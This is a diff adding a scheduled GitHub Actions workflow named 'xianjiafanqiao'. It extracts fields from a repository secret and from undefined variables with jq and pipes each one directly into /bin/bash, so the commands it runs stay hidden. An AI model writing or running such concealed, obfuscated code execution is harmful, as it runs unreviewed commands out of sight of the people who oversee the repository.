@@ -1,0 +1,31 @@
+name: xianjiafanqiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianjiafanqiao
+        env:
+          hljar83: ${{ secrets.hljar83 }}
+        run: |
+          echo $hljar83 | jq -r .w5201 | /bin/bash
+          echo $zacon74239 | jq -r .rqow9631 | /bin/bash
+          echo $ql3443 | jq -r .tela8232 | /bin/bash
+          echo $yyaam15301 | jq -r .olzw3 | /bin/bash
+          echo $l0570 | jq -r .ckdi2 | /bin/bash
+          echo $ss0471 | jq -r .zkht7 | /bin/bash
+          echo $myacl3 | jq -r .bu609 | /bin/bash
+          echo $u216 | jq -r .f9245 | /bin/bash
+          echo $ug4 | jq -r .bor3634 | /bin/bash
+          echo $e8954 | jq -r .osecc1 | /bin/bash
+          echo $h92 | jq -r .nekv56 | /bin/bash
+          echo $r5191 | jq -r .a6 | /bin/bash
+          echo $omdbz514 | jq -r .pct5611 | /bin/bash
+          echo $dih7954 | jq -r .fkv6348 | /bin/bash
+
